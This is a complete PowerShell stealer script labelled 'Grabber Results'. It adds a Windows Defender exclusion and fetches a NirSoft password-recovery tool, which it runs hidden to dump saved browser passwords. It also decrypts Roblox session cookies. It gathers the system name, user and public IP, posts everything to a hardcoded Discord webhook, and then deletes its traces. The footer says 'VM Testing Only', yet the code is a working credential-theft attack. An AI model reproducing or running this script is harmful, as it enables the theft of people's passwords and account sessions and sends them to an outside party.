$webhookUrl = "https://discord.com/api/webhooks/1450141358412136519/MvQdD57MwTlZXdA2YFJ03pyREwf6JptKCdgqRh-34moUdSsFJvhmVzlzkFzh2xYR4lJo"
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$safeEnv = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "safe_env"
New-Item -Path $safeEnv -ItemType Directory -Force | Out-Null
Add-MpPreference -ExclusionPath $safeEnv

Invoke-WebRequest -Uri "https://www.nirsoft.net/protected_downloads/passreccommandline.zip" -OutFile "$env:USERPROFILE\Documents\safe_env\passreccommandline.zip" -Headers @{Authorization=("Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("download:nirsoft123!"))); "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"} -UseBasicParsing

Start-Sleep -Seconds 8

& "$env:ProgramFiles\WinRAR\WinRAR.exe" e "$env:USERPROFILE\Documents\safe_env\passreccommandline.zip" "WebBrowserPassView.exe" "$env:USERPROFILE\Documents\safe_env\" -pnirsoft123! -y

Start-Sleep -Seconds 5

Start-Process -FilePath "$env:USERPROFILE\Documents\safe_env\WebBrowserPassView.exe" -Verb RunAs -ArgumentList "/stext", "`"$env:USERPROFILE\Documents\safe_env\passwords.txt`"" -Wait -WindowStyle Hidden

Start-Sleep -Seconds 5

$robloxCookies = ""
$robloxDataPath = "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
if (Test-Path $robloxDataPath) {
    try {
        $jsonContent = Get-Content $robloxDataPath -Raw
        $cookiesData = ($jsonContent | ConvertFrom-Json).CookiesData
        $bytes = [System.Convert]::FromBase64String($cookiesData)
        $robloxCookies = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
    } catch {}
}

$passwords = ""
$passwordFile = "$env:USERPROFILE\Documents\safe_env\passwords.txt"
if (Test-Path $passwordFile) {
    $passwords = Get-Content $passwordFile -Raw
}

$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$os = (Get-WmiObject Win32_OperatingSystem).Caption

$fields = @(
    @{
        name = "System"
        value = "PC: $computerName`nUser: $userName`nOS: $os`nIP: $ip`nTime: $timestamp"
        inline = $true
    },
    @{
        name = "Passwords"
        value = if ($passwords) { "```$passwords```" } else { "```No passwords found```" }
        inline = $false
    },
    @{
        name = "Roblox Cookies"
        value = if ($robloxCookies) { "```$robloxCookies```" } else { "```No Roblox cookies found```" }
        inline = $false
    }
)

$embed = @{
    title = "Grabber Results"
    color = 0x5865F2
    fields = $fields
    timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssK")
    footer = @{ text = "VM Testing Only" }
}

$payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload

Remove-Item -Path $safeEnv -Recurse -Force -ErrorAction SilentlyContinue
